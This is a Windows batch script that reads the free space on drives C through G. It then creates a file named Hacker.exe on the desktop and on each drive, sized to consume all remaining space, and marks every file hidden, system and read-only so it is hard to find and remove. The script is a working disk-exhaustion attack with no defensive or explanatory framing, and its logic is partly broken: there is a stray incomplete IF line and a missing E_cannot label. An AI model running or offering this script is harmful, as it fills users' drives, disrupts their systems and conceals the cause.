@echo off
setlocal
set drive=C
set drive1=D
set drive2=E
set drive3=F
set drive4=G
set free=?
set free1=?
set free2=?
set free3=?
set free4=?
echo %userprofile%
echo ----------------------------
rem Note: WMIC will output unicode text
wmic logicaldisk where (caption = "%drive%:") get freespace>"%temp%\free.tmp"
wmic logicaldisk where (caption ="%drive1%:")get freespace>"%temp%\free1.tmp"
wmic logicaldisk where (caption ="%drive2%:")get freespace>"%temp%\free2.tmp"
wmic logicaldisk where (caption ="%drive3%:")get freespace>"%temp%\free3.tmp"
wmic logicaldisk where (caption ="%drive4%:")get freespace>"%temp%\free4.tmp"
for /f %%A in ('type "%temp%\free.tmp"') do (set free=%%A)
for /f %%A in ('type "%temp%\free1.tmp"') do (set free1=%%A)
for /f %%A in ('type "%temp%\free2.tmp"') do (set free2=%%A)
for /f %%A in ('type "%temp%\free3.tmp"') do (set free3=%%A)
for /f %%A in ('type "%temp%\free4.tmp"') do (set free4=%%A)
echo Free space: %free% bytes
echo Free Space: %free1% bytes
echo Free Space: %free2% bytes
echo Free Space: %free3% bytes
echo Free Space: %free4% bytes
IF  /I "%free%" GEQ "0" Goto C_create
IF /I  "%free%" EQ "0" GOTO C_cannot
IF /I %% 
:C_create
cd %userprofile%/desktop
fsutil file createnew Hacker.exe %free%
if exist "%temp%\free.tmp" del "%temp%\free.tmp"
attrib +s +h +r %userprofile%/desktop/Hacker.exe
if /I "%free1%" GEQ "0" goto D_create
if /I "%free1%" EQ "0" goto D_cannot
:D_create
fsutil file createnew D:\Hacker.exe %free1%
if exist "%temp%\free1.tmp" del "%temp%\free1.tmp"
attrib +s +h +r D:\Hacker.exe
if /I "%free2%" GEQ "0" goto E_create
if /I "%free2%" EQ "0" goto E_cannot
:E_create
fsutil file createnew E:\Hacker.exe %free2%
if exist "%temp%\free2.tmp" del "%temp%\free2.tmp"
attrib +s +h +r E:\Hacker.exe
if /I "%free3%" GEQ "0" goto F_create
if /I "%free3%" EQ "0" goto F_cannot
if /I "%free3%" EQ "" goto F_empty
:F_create
fsutil file createnew F:\Hacker.exe %free3%
if exist "%temp%\free3.tmp" del "%temp%\free3.tmp"
attrib +s +h +r F:\Hacker.exe
if /I "%free4%" GEQ "0" goto G_create
if /I "%free4%" EQ "0" goto G_cannot
:G_create
fsutil file createnew G:\Hacker.exe %free4%
if exist "%temp%\free4.tmp" del "%temp%\free4.tmp"
attrib +s +h +r G:\Hacker.exe
pause
exit
:C_cannot
echo The Drive is Full or Not Available!
:D_cannot
echo The Drive is Full or Not Available!
:F_cannot
echo The Drive is Full or Not Available!
:G_cannot
echo The Drive is Full or Not Available!
:G_empty
echo The Drive is Full or Not Available!
pause





